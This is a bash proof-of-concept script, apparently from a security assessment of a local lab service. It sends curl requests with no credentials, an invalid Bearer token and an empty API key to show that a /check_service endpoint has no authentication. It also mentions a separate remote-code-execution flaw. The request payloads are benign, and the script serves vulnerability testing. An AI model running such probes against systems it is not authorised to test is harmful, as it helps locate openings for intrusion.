#!/bin/bash

# POC: Missing Authentication Controls on check_service Endpoint
# This script demonstrates that the /check_service endpoint accepts
# unauthenticated requests without any credentials, tokens, or API keys

TARGET_URL="http://127.0.0.1:80/check_service"

echo "=========================================="
echo "POC: Missing Authentication on check_service"
echo "=========================================="
echo ""

# Test 1: Basic unauthenticated POST request
echo "[*] Test 1: Unauthenticated POST request"
echo "Command: curl -X POST $TARGET_URL -H 'Content-Type: application/json' -d '{\"service_name\":\"test\"}'"
echo ""
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name":"test"}')
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name":"test"}')

echo "Response Code: $HTTP_CODE"
echo "Response Body: $RESPONSE"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
  echo "[✓] SUCCESS: Endpoint returned HTTP 200 without authentication"
else
  echo "[!] FAILED: Endpoint returned HTTP $HTTP_CODE"
  exit 1
fi

# Test 2: Request without any authentication headers
echo "[*] Test 2: Request without authentication headers (no Bearer token)"
echo "Command: curl -X POST $TARGET_URL -H 'Content-Type: application/json' -d '{\"service_name\":\"apache\"}'"
echo ""
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name":"apache"}')
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name":"apache"}')

echo "Response Code: $HTTP_CODE"
echo "Response Body: $RESPONSE"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
  echo "[✓] SUCCESS: Endpoint accepted request without Bearer token"
else
  echo "[!] FAILED: Endpoint returned HTTP $HTTP_CODE"
  exit 1
fi

# Test 3: Invalid/missing Authorization header is ignored
echo "[*] Test 3: Invalid Authorization header is ignored"
echo "Command: curl -X POST $TARGET_URL -H 'Authorization: Bearer invalid_token' -H 'Content-Type: application/json' -d '{\"service_name\":\"nginx\"}'"
echo ""
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Authorization: Bearer invalid_token" \
  -H "Content-Type: application/json" \
  -d '{"service_name":"nginx"}')
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET_URL" \
  -H "Authorization: Bearer invalid_token" \
  -H "Content-Type: application/json" \
  -d '{"service_name":"nginx"}')

echo "Response Code: $HTTP_CODE"
echo "Response Body: $RESPONSE"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
  echo "[✓] SUCCESS: Endpoint accepted request with invalid token (no validation)"
else
  echo "[!] FAILED: Endpoint returned HTTP $HTTP_CODE"
  exit 1
fi

# Test 4: No API key required
echo "[*] Test 4: No API key verification"
echo "Command: curl -X POST $TARGET_URL -H 'Content-Type: application/json' -H 'X-API-Key: ' -d '{\"service_name\":\"mysql\"}'"
echo ""
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "X-API-Key: " \
  -H "Content-Type: application/json" \
  -d '{"service_name":"mysql"}')
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET_URL" \
  -H "X-API-Key: " \
  -H "Content-Type: application/json" \
  -d '{"service_name":"mysql"}')

echo "Response Code: $HTTP_CODE"
echo "Response Body: $RESPONSE"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
  echo "[✓] SUCCESS: Endpoint accepted request without valid API key"
else
  echo "[!] FAILED: Endpoint returned HTTP $HTTP_CODE"
  exit 1
fi

echo ""
echo "=========================================="
echo "VULNERABILITY CONFIRMED"
echo "=========================================="
echo "[✓] All tests passed - endpoint has NO authentication"
echo "[✓] Any client can access /check_service without credentials"
echo "[✓] Combined with RCE vulnerability = CRITICAL RISK"
echo ""